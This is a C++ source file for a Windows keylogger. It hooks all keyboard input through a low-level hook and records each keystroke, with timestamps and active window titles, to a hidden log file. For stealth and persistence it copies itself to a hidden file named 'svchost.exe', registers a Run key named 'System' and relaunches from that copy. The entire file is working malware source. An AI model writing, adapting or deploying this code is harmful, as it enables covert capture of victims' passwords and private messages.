#include "keylogger.hpp"

#include <fstream>
#include <lmcons.h>
#include <ShlObj_core.h>

// Wrapper to get a filesystem::path from SHGetKnownFolderPath
static bool get_known_folder(const KNOWNFOLDERID& folder_id, std::filesystem::path& path, std::wstring_view append = { })
{
    PWSTR tmp{ };
    if (SUCCEEDED(SHGetKnownFolderPath(folder_id, 0, nullptr, &tmp))) {
        path = tmp;
        CoTaskMemFree(tmp);
        if (!append.empty())
            path /= append;
        return true;
    }
    return false;
}

static LRESULT CALLBACK keyboard_hook(int code, WPARAM wparam, LPARAM lparam)
{
    if (code >= 0 && wparam == WM_KEYDOWN)
            g_logger.process_key(reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam)->vkCode);

    return CallNextHookEx(g_logger.hook(), code, wparam, lparam);
}

keylogger::keylogger()
{
    ensure_single_instance();
    set_autostart();
    m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
    create_log();
}

keylogger::~keylogger()
{
    if (m_mutex)
        CloseHandle(m_mutex);
}

WPARAM keylogger::run() const
{
    MSG msg{ };
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(m_hook);
    return msg.wParam;
}

void keylogger::process_key(uint32_t code)
{
    update_time();
    update_window();

    if (m_special_keys.find(code) != m_special_keys.end())
        write_to_log(m_special_keys.at(code));
    else {
        // Workaround for GetKeyboardState which doesn't work
        for (int i = 0; i <= 255; i++)
            m_keys[i] = HIBYTE(GetKeyState(i));

        WCHAR key_name[4]{ };
        ToUnicode(code, MapVirtualKey(code, MAPVK_VK_TO_VSC), m_keys.data(), key_name, 4, 0);
        write_to_log(key_name);
    }
}

void keylogger::create_log()
{
    WCHAR username[UNLEN + 1]{ };
    DWORD username_size{ UNLEN + 1 };
    GetUserName(username, &username_size);

    if (get_known_folder(FOLDERID_LocalAppData, m_log_path, std::format(L"temp/{}.txt", username).c_str()))
        if (const auto handle = CreateFile(m_log_path.c_str(), 0, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, nullptr))
            CloseHandle(handle);
}

void keylogger::write_to_log(std::wstring_view output) const
{
    std::wfstream out{ m_log_path, std::wfstream::app | std::wfstream::out };
    if (out.good()) {
        if (!(GetFileAttributes(m_log_path.c_str()) & FILE_ATTRIBUTE_HIDDEN))
            SetFileAttributes(m_log_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
        out << output;
        out.flush();
        out.close();
    }
}

void keylogger::set_autostart()
{
    WCHAR original_path[MAX_PATH]{ };
    GetModuleFileName(nullptr, original_path, MAX_PATH);
    
    if (get_known_folder(FOLDERID_LocalAppData, m_duplicate_path, L"Microsoft\\Windows\\svchost.exe")) {
        if (!m_duplicate_path.compare(original_path))
            return;

         CopyFile(original_path, m_duplicate_path.c_str(), TRUE);
         SetFileAttributes(m_duplicate_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
         
         HKEY key{ };
         RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr);
         RegSetValueEx(key, L"System", 0, REG_SZ, reinterpret_cast<const BYTE*>(m_duplicate_path.c_str()), MAX_PATH);
         RegCloseKey(key);
         
         start_duplicate_and_exit();
    }
}

void keylogger::start_duplicate_and_exit() const
{
    STARTUPINFO start_info{ };
    PROCESS_INFORMATION proc_info{ };
    SecureZeroMemory(&start_info, sizeof(start_info));
    SecureZeroMemory(&proc_info, sizeof(proc_info));

    CreateProcess(m_duplicate_path.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &start_info, &proc_info);

    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);
    PostQuitMessage(EXIT_SUCCESS);
}

void keylogger::ensure_single_instance()
{
    m_mutex = CreateMutex(nullptr, FALSE, L"keylogger");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        PostQuitMessage(EXIT_FAILURE);
}

void keylogger::update_time() const
{
    const auto time = std::time(nullptr);
    const auto localtime = std::localtime(&time);
    static int last_minute{ };
    
    if (last_minute != localtime->tm_min) {
        last_minute = localtime->tm_min;
    
        WCHAR time_str[30]{ };
        std::wcsftime(time_str, 30, L"\n[%d-%m-%Y - %H:%M] ", localtime);
        write_to_log(time_str);
    }
}

void keylogger::update_window() const
{
    const auto window = GetForegroundWindow();
    static HWND last_window{ };

    if (last_window != window) {
        last_window = window;

        WCHAR title[256]{ };
        GetWindowText(window, title, 256);

        std::wstring title_formatted{ title };
        title_formatted.insert(0, L"[Window: ");
        title_formatted.append(L"] ");
        write_to_log(title_formatted);
    }
}
